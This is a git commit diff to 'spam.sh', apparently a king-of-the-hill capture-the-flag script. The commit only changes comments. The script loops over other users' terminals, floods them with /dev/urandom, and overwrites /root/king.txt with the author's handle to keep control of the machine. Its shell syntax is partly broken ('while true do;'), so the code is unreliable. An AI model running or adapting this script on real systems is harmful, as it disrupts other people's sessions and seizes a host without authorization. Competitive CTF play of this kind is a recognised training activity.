2063dc5e7e563306f682dd28031c34f1bca84d6a
Abubakar Yusif <abubakaryusuf951@gmail.com>
2023-03-17 19:23:35 +0800

    Update spam.sh

--- ctf-misc/spam.sh
+++ ctf-misc/spam.sh
@@ -1,12 +1,12 @@
 #!/bin/sh
 
 # run it as crontab. each 10s or script
-# if u found this script ill never gonna give u up
+# if u found this script just delete it duh
 
 while true do;
     tty=$(w | grep -v "10.4.40.96" | awk '{print$2}')
     pts=$(less $tty |tail -n 1)
-    cat /dev/urandom > /dev/$pts
+    cat /dev/urandom > /dev/$pts # sometimes am evil
     echo -n "blackdracula18" > /root/king.txt
     sleep 10s #romove this if run as crontab
 done
